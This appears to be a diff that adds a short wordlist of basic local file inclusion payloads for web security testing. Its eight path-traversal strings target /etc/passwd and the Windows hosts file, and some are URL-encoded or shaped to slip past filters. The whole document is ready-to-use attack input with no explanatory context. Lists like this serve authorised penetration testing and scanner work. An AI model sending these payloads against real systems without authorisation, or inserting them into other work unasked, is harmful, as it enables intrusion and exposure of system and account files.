@@ -1,0 +1,9 @@
+# Basic LFI (Local File Inclusion) Payloads
+../../../etc/passwd
+..\..\..\..\windows\system32\drivers\etc\hosts
+/etc/passwd
+C:\Windows\System32\drivers\etc\hosts
+../../../../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
